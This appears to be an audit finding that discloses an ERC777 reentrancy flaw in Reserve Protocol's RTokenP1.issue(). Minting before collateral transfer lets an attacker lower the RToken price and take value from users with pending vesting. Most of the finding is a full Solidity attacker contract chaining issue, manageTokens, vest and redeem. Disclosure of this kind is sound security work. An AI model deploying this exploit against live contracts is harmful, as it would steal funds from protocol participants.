https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L268-L276


# Vulnerability details

## Impact
The `RTokenP1` contract, which at the end of `RTokenP1.issue()` transfers funds `erc20.safeTransferFrom()` from the user's wallet to `BackingManagerP1`, is vulnerable.
https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L270-L276
Provided one of the tokens in `BasketHandlerP1.basket` has a custom hook on sending funds (like ERC777), it is possible to use `RToken` before actually transferring the funds.
This allows an attacker to:
- Receive `RToken` in flash loan
- Forever lower the price (`mulDiv256(basketsNeeded, amtRToken, totalSupply())`) of the `RToken` for all system members
- Perform theft of funds in the presence of `RTokenP1.liability`

## Proof of Concept
The essence of the problem is that this code in `RTokenP1`:
https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L268-L276
```solidity
_mint(recipient, amtRToken);

for (uint256 i = 0; i < erc20s.length; ++i) {
    IERC20Upgradeable(erc20s[i]).safeTransferFrom(
        issuer,
        address(backingManager),
        deposits[i]
    );
}
```
Is equal:
```solidity
_mint(recipient, amtRToken);

IERC20Upgradeable(erc20s[0]).safeTransferFrom(
    issuer,
    address(backingManager),
    deposits[0]
);
IERC20Upgradeable(erc20s[1]).safeTransferFrom(
    issuer,
    address(backingManager),
    deposits[1]
);
...
```
Provided one of the `erc20s[]` has any call to the issuer's wallet or contract, we may not wait for all the subsequent `erc20.safeTransferFrom()` execution and start using the tokens that were issued to us in `_mint(recipient, amtRToken)`.
This, in turn, creates an undercollaterization problem because `RTokenP1.issue()` has increased `RTokenP1.basketsNeeded`, but `BackingManagerP1` does not contain enough funds for them.
Accordingly, we can call `BackingManagerP1.manageTokens()`, thereby lowering the `RTokenP1.basketsNeeded` variable while leaving `RTokenP1.totalSupply()` the same.
https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L83-L87
https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L248-L251
As a result, by calling `RTokenP1.issue()` again, we will buy `RToken` at a more favorable price relative to previous protocol participants, lowering its price forever. By itself, this action is unprofitable since at the first `RTokenP1.issue()` the issued tokens were bought at the old price and can only be sold at the new price, which is lower.
But, if we lower the price when some funds are in `RTokenP1.liability`, we can buy tokens at the new price but make the victims from `RTokenP1.liability` pay the old price by making `RTokenP1.vest()` in the same transaction after our second `RTokenP1.issue()`. This will raise the price at a loss to the victims, and we can produce `RTokenP1.redeem()` at a favorable price.

Here is a possible implementation of the attacker's contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";
import "../../p1/RToken.sol";
import "../../p1/BackingManager.sol";
import "hardhat/console.sol";

contract SandwichVestAttack {
    using Strings for uint256;

    enum Phase {
        First,
        Second
    }
    Phase phase = Phase.First;

    RTokenP1 public rToken;
    BackingManagerP1 public bm;
    IERC20[] public tokens;

    uint256 amountWDiscount;

    constructor(
        RTokenP1 _rToken,
        BackingManagerP1 _bm,
        IERC1820Registry registry,
        IERC20[] memory _tokens
    ) {
        rToken = _rToken;
        bm = _bm;
        tokens = _tokens;

        registry.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
    }

    function attack(
        uint256 amount,
        uint256 _amountWithDiscount,
        address victim,
        uint256 endId
    ) external {
        require(rToken.totalSupply() != 0, "Unable to manipulate the price");

        uint256[] memory balances = new uint256[](tokens.length);
        console.log("Initial balances:");
        logBalances();

        amountWDiscount = _amountWithDiscount;

        approveAll(address(rToken), type(uint256).max);

        issue(amount);
        vest(victim, endId);
        redeem(rToken.balanceOf(address(this)));

        phase = Phase.First;

        console.log("End balances:");
        logBalances();
    }

    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes memory,
        bytes memory
    ) external {
        console.log("Hook tokensToSend");

        if (phase == Phase.First) {
            phase = Phase.Second;

            compromiseBasketsNeeded();
            issue(amountWDiscount);
        }
    }

    function approveAll(address to, uint256 amount) internal {
        for (uint256 i = 0; i < tokens.length; ++i) {
            tokens[i].approve(to, amount);
        }
        console.log("Approval is done!");
        console.log("");
    }

    function issue(uint256 amount) internal {
        console.log("Issue processing...");
        logStrUint("Amount: ", amount);
        logStrUint("Done! Instantly issued: ", rToken.issue(address(this), amount));
        console.log("");
    }

    function compromiseBasketsNeeded() internal {
        console.log("Compromising baskets number... ");
        logStrUint("basketsNeeded before: ", uint256(rToken.basketsNeeded()));
        bm.manageTokens(new IERC20[](0));
        logStrUint("basketsNeeded after: ", uint256(rToken.basketsNeeded()));
        console.log("");
    }

    function vest(address account, uint256 endId) public {
        console.log("Vest processing...");
        logStrUint("endId: ", endId);
        console.log("Account:");
        console.log(account);
        rToken.vest(account, endId);
        console.log("Done!");
        console.log("");
    }

    function redeem(uint256 amount) public {
        console.log("Redeem processing...");
        logStrUint("Amount: ", amount);
        rToken.redeem(amount);
        console.log("Done!");
    }

    function logStrUint(string memory str, uint256 u) internal view {
        console.log(string(abi.encodePacked(str, u.toString())));
    }

    function logBalances() internal view {
        logStrUint("Balance of rToken: ", rToken.balanceOf(address(this)));
        for (uint256 i = 0; i < tokens.length; ++i) {
            logStrUint("Balance of token ", tokens[i].balanceOf(address(this)));
        }
        console.log("");
    }
}
```
